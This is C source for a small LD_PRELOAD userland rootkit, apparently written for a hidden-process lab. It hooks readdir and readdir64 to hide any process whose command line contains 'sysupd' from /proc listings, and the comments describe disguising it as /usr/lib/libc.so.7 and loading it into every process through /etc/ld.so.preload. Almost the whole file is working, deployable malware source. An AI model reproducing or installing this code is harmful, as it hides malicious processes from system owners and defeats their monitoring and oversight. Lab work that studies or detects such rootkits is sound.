// A small userland "rootkit" for the hidden-process lab, built as /usr/lib/libc.so.7 to
// pass for part of glibc (the real one is libc.so.6). It hides any process whose
// command line contains "sysupd" from directory listings of /proc, which is what
// ps, top and ls read. Loaded into every process by /etc/ld.so.preload.
#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>

static int is_hidden(const char *name) {
    if (!*name) return 0;
    for (const char *c = name; *c; c++)
        if (!isdigit((unsigned char)*c)) return 0;
    char path[64], buf[256];
    snprintf(path, sizeof path, "/proc/%s/cmdline", name);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f);
    buf[n] = 0;
    return strstr(buf, "sysupd") != NULL;
}

struct dirent *readdir(DIR *d) {
    static struct dirent *(*real)(DIR *);
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(d)) && is_hidden(e->d_name)) {
    }
    return e;
}

struct dirent64 *readdir64(DIR *d) {
    static struct dirent64 *(*real)(DIR *);
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real(d)) && is_hidden(e->d_name)) {
    }
    return e;
}
